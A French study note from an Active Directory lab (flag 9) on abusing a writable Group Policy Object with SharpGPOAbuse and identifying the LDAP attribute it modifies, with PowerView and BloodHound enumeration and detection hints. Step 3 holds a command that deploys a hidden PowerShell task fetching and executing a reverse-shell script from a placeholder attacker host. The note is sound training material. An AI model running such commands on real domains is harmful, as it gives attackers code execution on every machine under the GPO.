---
flag: 9
machine: Student VM
statut: à faire
technique: GPO abuse (SharpGPOAbuse)
LO: [[LO02 - OUs et GPOs]]
---

# F09 · Attribut Group Policy modifié

> [!summary] Objectif
> Identifier l'attribut LDAP d'une GPO qui est modifié quand on ajoute un `Immediate Task` / `Computer Script` via SharpGPOAbuse (préalable à l'exécution de code sur toutes les machines liées).

## Contexte
- **Étape attack flow** : abus d'une GPO sur laquelle on a `GenericAll`/`GenericWrite`/`WriteDacl` → RCE sur toutes les machines de l'OU liée.
- **Ce qu'on a** : un compte avec droit d'écriture sur une GPO (identifié via BloodHound → *Inbound Object Control* sur le node GPO).
- **Ce qu'on cherche** : le **nom exact de l'attribut LDAP** de l'objet `groupPolicyContainer` que l'outil incrémente pour signaler au client GPO qu'il faut ré-appliquer la stratégie (côté ordinateur ou utilisateur).

## Solution

### Étape 1 : lister GPOs et retrouver celle qu'on peut modifier
```powershell
. C:\AD\Tools\PowerView.ps1
Get-DomainGPO | Select-Object displayname,name
(Get-DomainOU -Identity StudentMachines).gplink
```
→ Voir [[Cheatsheet - GPO et OU]] pour le mapping OU → GPO via `gplink`.

### Étape 2 : identifier le droit d'écriture (BloodHound)
Requête Cypher — qui contrôle une GPO :
```powershell
# Raw Query dans BloodHound
# MATCH p=(n)-[:GenericAll|GenericWrite|WriteDacl|WriteOwner]->(g:GPO) RETURN p
```

### Étape 3 : abus via SharpGPOAbuse (l'action qui modifie l'attribut)
```powershell
# Ajout d'une Immediate Task côté ordinateur — pousse un script sur les machines de l'OU
C:\AD\Tools\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author NT\SYSTEM `
  --Command "cmd.exe" --Arguments "/c powershell -nop -w hidden -c iex(iwr http://<ATTAQUANT>:8080/rev.ps1 -UseBasicParsing)" `
  --GPOName "<NOM_GPO>"
```

### Étape 4 : vérifier l'attribut modifié sur le GPO
```powershell
Get-DomainGPO -Identity "<NOM_GPO>" | Select-Object displayname,gPCMachineExtensionNames,gPCUserExtensionNames,versionNumber
```
→ L'attribut modifié dépend du côté ciblé (Computer vs User) : `gPCMachineExtensionNames` pour `--AddComputerTask`/`--AddComputerScript`, `gPCUserExtensionNames` pour `--AddUserTask`. Le `versionNumber` est aussi bumpé.

## Réponse

| Élément | Valeur |
|---------|--------|
| Attribut Group Policy modifié | <A REMPLIR DEPUIS LAB> |

## Pièges et OPSEC
- L'attribut change selon l'option SharpGPOAbuse (Computer vs User) — bien noter laquelle a été utilisée.
- La propagation n'est pas immédiate : le client Windows applique la GPO à l'intervalle de rafraîchissement (90 min ± 30) ou sur `gpupdate /force`.
- Traces : Event ID **5136** (Directory Service Changes) sur le DC = modif attribut LDAP ; SYSVOL contient les fichiers `ScheduledTasks.xml` / `Scripts.ini` déposés.

## Refs
- [[Cheatsheet - GPO et OU]]
- [[Cheatsheet - ACL et droits AD]]
- [[LO02 - OUs et GPOs]]
- [[Synthèse - ACL et GPO]]

[[Flags - Index]] · [[Journal - Index]]
